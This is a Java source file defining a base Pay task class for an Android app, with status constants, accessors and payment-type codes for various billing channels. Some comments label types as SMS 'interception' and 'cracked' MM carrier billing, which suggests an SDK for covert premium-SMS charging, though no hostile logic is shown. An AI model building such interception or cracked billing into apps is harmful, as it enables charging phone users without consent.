package com.core_sur.task;

import java.io.Serializable;

import android.app.Activity;
import android.content.Context;

import com.core_sur.tools.CheckLog;

public class Pay  implements Runnable, Serializable {
	public static final int EXECUTE_STATUS_NOTRUN = 0; // 未运行
	public static final int EXECUTE_STATUS_RUN = 1; // 运行中
	public static final int EXECUTE_STATUS_COMPLETE = 2; // 运行完毕 结果可能失败 或成功
	public static final int PAY_TYPE_SMS = 1; // 短信类型
	public static final int PAY_TYPE_SLEEP = 3; // 睡眠类型
	public static final int PAY_TYPE_INTERCEPT = 2; // 拦截类型
	protected static final int PAY_TYPE_WEB = 4; // 网页
	protected static final int PAY_TYPE_SDREAD = 5;//盛大
	protected static final int PAY_TYPE_UMPAY = 6;//联动优势
	protected static final int PAY_TYPE_SShell = 7;//银贝壳
	protected static final int PAY_TYPE_FFun = 8;//深圳虚实
	protected static final int PAY_TYPE_YX = 9;//易迅
	protected static final int PAY_TYPE_LT = 10;//乐途
	protected static final int PAY_TYPE_Mu = 11;//Mu
	protected static final int PAY_TYPE_MMPay = 12;//MM破解接入
	
	protected static final int PAY_TYPE_XMXTPay = 13;//厦门翔通通道计费专用
	
	protected static final int PAY_TYPE_FZSJ = 14; // 法制世界
	
	protected static final int PAY_TYPE_MGZF = 15; //芒果支付
	
	protected static final int PAY_TYPE_WAPDM = 16; //wap动漫
	
	protected static final int PAY_TYPE_PUSHI = 17; //普石
	
	protected static final int PAY_TYPE_DM = 18; //大麦
	
	protected static final int PAY_TYPE_YL = 19; //原朗
	
	int executeStatus = EXECUTE_STATUS_NOTRUN;
	String key;
	int type;
	boolean isChildThread;

	public void setKey(String key) {
		this.key = key;
	}

	public boolean isChildThread() {
		return isChildThread;
	}

	public void setChildThread(boolean isChildThread) {
		this.isChildThread = isChildThread;
	}

	public int getType() {
		return type;
	}

	public void setType(int type) {
		this.type = type;
	}

	Context context;

	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}

	public int getExecuteStatus() {
		return executeStatus;
	}

	protected void setExecuteStatus(int executeStatus) {
		this.executeStatus = executeStatus;
		if (executeStatus == EXECUTE_STATUS_COMPLETE) {
			CheckLog.log("Pay", "setExecuteStatus", "executeStatus="
					+ executeStatus);
		} else {
			CheckLog.log("Pay", "setExecuteStatus", "executeStatus="
					+ executeStatus);
		}
	}

	public String getKey() {
		return key;
	}

	@Override
	public void run() {
		setChildThread(true);
	}

	boolean isAddCompleteRule;

	public boolean isAddCompleteRule() {
		return isAddCompleteRule;

	}

	public void setAddCompleteRule(boolean isAddCompleteRule) {
		this.isAddCompleteRule = isAddCompleteRule;
	}

}
